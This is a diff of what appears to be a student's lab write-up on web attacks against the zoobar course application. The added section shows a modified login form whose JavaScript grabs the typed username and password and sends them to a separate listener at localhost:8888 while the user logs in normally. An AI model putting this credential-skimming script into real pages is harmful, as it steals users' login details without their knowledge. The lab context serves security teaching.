@@ -53,4 +53,18 @@ In this exercise we can retrieve the information from the zoobarjs file to see i
 
 The answer-2.html file must be located in the same folder as the answer-3.html file so that the CSRF attack works as expected.
 
+For intercepting the users credentials following modifications were done to the form HTML code, also some new JavaScript was added:
+
+    <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="intercept()">
+    
+    <script>
+        function intercept() {
+		var username = document.forms[0].elements[0].value;
+		var password = document.forms[0].elements[1].value;
+		new Image().src = "http://localhost:8888/?username="+username+"&password="+password;
+	}
+	</script>
+	
+When the user enters his or her credentials, they will be sent to the attacker and user will be logged in normally.
+
 ###Exercise 4: Profile Worm
